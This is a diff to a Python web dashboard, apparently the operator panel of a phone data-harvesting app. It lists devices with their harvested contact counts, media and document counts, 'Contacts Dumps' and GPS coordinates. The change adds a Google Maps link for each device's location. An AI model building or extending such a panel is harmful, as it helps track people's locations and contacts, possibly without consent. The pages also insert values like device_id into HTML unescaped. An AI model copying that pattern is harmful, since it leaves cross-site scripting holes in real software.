@@ -125,9 +125,10 @@ def dashboard():
     conn.close()
     html = ['<html><head><title>SecureData Dashboard</title><style>body{font-family:Arial;margin:24px} table{border-collapse:collapse;width:100%} th,td{border:1px solid #ddd;padding:8px} a{color:#0a66c2;text-decoration:none} a:hover{text-decoration:underline} .nav{margin-bottom:16px}</style></head><body>']
     html.append('<div class="nav"><a href="/dashboard">Dashboard</a> | <a href="/devices">Devices</a> | <a href="/contacts">Contacts</a> | <a href="/uploads">Uploads</a></div>')
-    html.append('<h2>Latest Device Data</h2><table><tr><th>ID</th><th>Device</th><th>Model</th><th>OS</th><th>Contacts</th><th>Images</th><th>Videos</th><th>Docs</th><th>Lat</th><th>Lon</th><th>Time</th><th>View</th></tr>')
+    html.append('<h2>Latest Device Data</h2><table><tr><th>ID</th><th>Device</th><th>Model</th><th>OS</th><th>Contacts</th><th>Images</th><th>Videos</th><th>Docs</th><th>Lat</th><th>Lon</th><th>Time</th><th>Map</th><th>View</th></tr>')
     for r in rows:
-        html.append(f'<tr><td>{r[0]}</td><td>{r[1]}</td><td>{r[2]}</td><td>{r[3]}</td><td>{r[4]}</td><td>{r[5]}</td><td>{r[6]}</td><td>{r[7]}</td><td>{r[8]}</td><td>{r[9]}</td><td><a href="/device/{r[1]}">详情</a></td></tr>')
+        mapLink = f'<a href="https://www.google.com/maps/search/?api=1&query={r[8]},{r[9]}" target="_blank">打开</a>' if (r[8] is not None and r[9] is not None) else ''
+        html.append(f'<tr><td>{r[0]}</td><td>{r[1]}</td><td>{r[2]}</td><td>{r[3]}</td><td>{r[4]}</td><td>{r[5]}</td><td>{r[6]}</td><td>{r[7]}</td><td>{r[8]}</td><td>{r[9]}</td><td>{mapLink}</td><td><a href="/device/{r[1]}">详情</a></td></tr>')
     html.append('</table>')
     html.append('<h2>Contacts Uploads</h2><table><tr><th>ID</th><th>Device</th><th>Count</th><th>Time</th><th>View</th></tr>')
     for cRow in contacts:
@@ -167,9 +168,10 @@ def device_detail(device_id):
     conn.close()
     html = ['<html><head><title>Device Detail</title><style>body{font-family:Arial;margin:24px} table{border-collapse:collapse;width:100%} th,td{border:1px solid #ddd;padding:8px} a{color:#0a66c2;text-decoration:none} a:hover{text-decoration:underline}</style></head><body>']
     html.append(f'<h2>Device {device_id}</h2>')
-    html.append('<h3>Recent Device Data</h3><table><tr><th>Model</th><th>OS</th><th>Contacts</th><th>Images</th><th>Videos</th><th>Docs</th><th>Lat</th><th>Lon</th><th>Time</th></tr>')
+    html.append('<h3>Recent Device Data</h3><table><tr><th>Model</th><th>OS</th><th>Contacts</th><th>Images</th><th>Videos</th><th>Docs</th><th>Lat</th><th>Lon</th><th>Time</th><th>Map</th></tr>')
     for r in data:
-        html.append(f'<tr><td>{r[0]}</td><td>{r[1]}</td><td>{r[2]}</td><td>{r[3]}</td><td>{r[4]}</td><td>{r[5]}</td><td>{r[6]}</td><td>{r[7]}</td><td>{r[8]}</td></tr>')
+        mapLink = f'<a href="https://www.google.com/maps/search/?api=1&query={r[6]},{r[7]}" target="_blank">打开</a>' if (r[6] is not None and r[7] is not None) else ''
+        html.append(f'<tr><td>{r[0]}</td><td>{r[1]}</td><td>{r[2]}</td><td>{r[3]}</td><td>{r[4]}</td><td>{r[5]}</td><td>{r[6]}</td><td>{r[7]}</td><td>{r[8]}</td><td>{mapLink}</td></tr>')
     html.append('</table>')
     html.append('<h3>Contacts Dumps</h3><table><tr><th>ID</th><th>Count</th><th>Time</th><th>View</th></tr>')
     for cRow in contacts:
